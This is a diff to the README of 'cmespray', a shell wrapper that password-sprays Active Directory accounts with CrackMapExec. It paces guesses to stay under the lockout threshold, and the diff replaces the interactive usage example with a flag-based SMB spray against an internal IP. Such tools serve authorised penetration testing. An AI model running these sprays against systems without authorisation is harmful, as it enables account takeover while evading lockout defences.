@@ -1,13 +1,9 @@
 # cmespray
-Password spray Active Directory accounts with [crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec) according to reset counter and lockout threshold policies
+Password spray Active Directory accounts with [crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec) according to reset counter and lockout threshold policies. Modified to use flags instead of prompt for input. Now has options for protocol and port.
 
 ### Usage
 ```
-[user::cmespray]$ ./cmespray.sh 
-Enter the 'Reset Account Lockout Counter After' value: 15
-Enter the 'Account Lockout Threshold' value: 3
-Enter the Domain Controller IP Address: 192.168.1.100
-Enter path to a password list: passwords.txt
-Enter path to domain users list: users.txt
-[*] Trying 2 passwords every 16 minutes against 192.168.1.100 and using passwords.txt and users.txt lists.
+┌──(root㉿kali)-[/home/kali/]
+└─# bash ../cmespray/cmespray-2.sh -t 10.0.1.10 -m smb -u ./test-users.txt -p ./test-pass.txt -l 3 -r 4 -n 445 
+[*] Trying 2 passwords every 5 minutes against 10.0.1.10 and using ./test-pass.txt and ./test-users.txt lists.
 ```
